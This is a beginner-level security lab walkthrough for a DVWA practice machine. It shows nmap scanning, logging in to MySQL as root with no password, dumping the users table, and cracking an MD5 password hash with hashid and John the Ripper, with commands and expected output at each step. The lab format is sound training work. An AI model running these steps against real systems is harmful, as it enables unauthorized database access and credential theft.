# 🎓 **Lab 2 — Beginner Edition: Hack the Database Like a Pro (Safely!)**

---

## 🧰 TOOLS YOU'LL USE (Imagine these are your hacking toys 🧸)

| Tool               | What it does (like a toy's power!)               |
|--------------------|--------------------------------------------------|
| **Kali Linux**     | Your hacker playground (like a superhero HQ)    |
| **nmap**           | Scans other computers to see open doors 🏠🔍     |
| **mysql-client**   | A way to talk to the database like a chat app 💬 |
| **hashid**         | Tells you what kind of password hash it is 🔍    |
| **John the Ripper**| Cracks passwords (like solving secret codes 🧠) |

---

# ✅ PART 1: Find & Open the Secret Door (aka connect to MySQL)

---

### 🥽 1.1 Find Which Doors Are Open  
**🧠 GOAL:** Look at the victim machine and see which service (door) is open.

```bash
nmap -sV [target-ip]
```

Replace `[target-ip]` with the real IP of the target (e.g., `192.168.153.140`).

**What you’re looking for:**  
Look for a line that says:

```
3306/tcp open  mysql
```

👉 Means **MySQL is running** on port 3306.

---

### 🧪 1.2 Try to Login to Database  
Use:

```bash
mysql -h [target-ip] -u root -p
```

If it asks for a password and **fails**, try this instead:

```bash
mysql -h [target-ip] -P 3306 -u root --password= --skip-ssl
```

✅ If it works, you'll see:
```
Welcome to the MariaDB monitor...
```

📢 **Why this is bad (from security view)**:  
You connected **without any password**! That’s like entering someone’s house because the door wasn’t locked. 🚪🔓

---

# ✅ PART 2: Explore the Database World 🌍

---

### 📚 2.1 See What Databases Exist

In the MariaDB monitor, type:

```sql
SHOW DATABASES;
```

Look for ones like `dvwa`, `mysql`, `metasploit`.

---

### 📂 2.2 Pick a Database to Explore

Choose one like `dvwa`:

```sql
USE dvwa;
```

---

### 📄 2.3 See What’s Inside

```sql
SHOW TABLES;
```

You'll see tables like:
```
guestbook
users
```

Let’s look inside the `users` table:

```sql
SELECT * FROM users;
```

You’ll get usernames and **weird password-looking strings** like:
```
5f4dcc3b5aa765d61d8327deb882cf99
```

---

# ✅ PART 3: Crack the Password Code 🧠🔐

---

### 🧠 3.1 Figure Out What Kind of Password It Is

Copy one of the hashes. Example:
```
5f4dcc3b5aa765d61d8327deb882cf99
```

Then in Kali terminal:

```bash
hashid 5f4dcc3b5aa765d61d8327deb882cf99
```

It will say something like:
```
[+] MD5
```

So this hash is using **MD5**.

---

### 🧨 3.2 Crack It Like a Puzzle Piece

Save the hash in a file:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
```

Now crack it with:

```bash
john hash.txt --format=raw-md5
```

Wait a bit... you’ll see:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)
```

✅ You cracked it! The password is: `password` 😱  
(Yes, people really use dumb passwords like this.)

---

# 🧾 What You Should Record in Report

| Step | What to show |
|------|--------------|
| Nmap scan | Screenshot of port 3306 open |
| MySQL connection | Screenshot of successful login (with/without password) |
| Databases/tables | Show what’s inside (users + passwords) |
| Hashes | Show the hash + what tool detected |
| Cracked Password | Show result from John the Ripper |

---

# 🎉 FINAL THOUGHT

You just:
- Found an open database
- Got inside without a password
- Read users’ info
- Cracked a hashed password

This is EXACTLY what real hackers do — which is why learning this helps you **defend against it** in real life. 🛡️